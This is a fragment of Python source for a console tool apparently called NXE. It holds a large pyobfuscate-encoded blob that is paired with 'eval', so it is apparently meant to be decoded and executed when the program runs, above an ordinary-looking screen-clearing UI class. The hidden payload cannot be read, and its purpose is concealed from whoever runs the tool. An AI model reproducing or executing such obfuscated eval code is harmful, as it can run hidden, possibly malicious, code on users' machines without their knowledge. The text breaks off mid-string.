...
obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(eval)'],['''F_%N<f0Mdv2p%Q&R%W|(nQaCjqnFXqD^<f^m-IoS{EhC06TzKg&A|=W`X`IyvXv4vF}>-<I5e((_0d_j=eMj9g>>I$OeZwbv;^vjPbBZgHzVuL^MbEzP`)WmGP0ela%C+~C+J!fnFIy~i6qjc0TbE+m}EbzGVzvCK>xUSm=@~TEzQ@~fR-!c)LW3|j0K(cL?3<P8f7TQ3{lw$_Au>VEK>xkS2(n&G)Iiu=x#s(8L<Dd+;rpm6VYZSU0SyLejsn-g8uhuW%UU~$mStqYK_!NZaW4E?O3wxE1W%zM^nKeM290iKi9wYhI;RPOV1M0ZheVLI*&*baJ?>v!$%3eS-zf|Cp3l{tKNlXkc5zYPhm)<qVt31)g`Pq8KHONn2WQBAP;bnc4=g|mK}0$>><;B60@!qA*&h8tcG`(Ue37kP(Q+%+Ajh#7Q7Zsg$cpi#D1TDM+Pn-YlqE_UNW)Mj`Bg$Q3ZA9O_weB*$L0)Gy0k?`;8o1avN@}OfX!ri&=0'''.replace('\n','')]))
...
class Console():        
    def ui(self):
        os.system(f'cls && title NXE  ^|  For Help open an issue on github.' if os.name == "nt" else "clear")
        print(center(f"""\n\n
